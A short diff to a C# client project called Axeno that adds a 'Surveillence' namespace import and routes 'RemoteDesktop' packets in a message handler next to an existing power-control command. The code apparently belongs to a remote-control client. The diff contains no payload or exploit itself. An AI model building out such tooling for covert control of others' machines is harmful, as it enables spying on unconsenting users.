@@ -1,6 +1,7 @@
 ﻿using Axeno.Client.MessagePack;
 using Axeno.Client.Networking.Functions;
 using Axeno.Client.Networking.Functions.General;
+using Axeno.Client.Networking.Functions.Surveillence;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -52,6 +53,11 @@ namespace Axeno.Client.Networking
                     case "Power":
                         {
                             PowerControl.HandlePower(msgpck);
+                            break;
+                        }
+                    case "RemoteDesktop":
+                        {
+                            RemoteDesktop.HandlePacket(msgpck);
                             break;
                         }
                 }
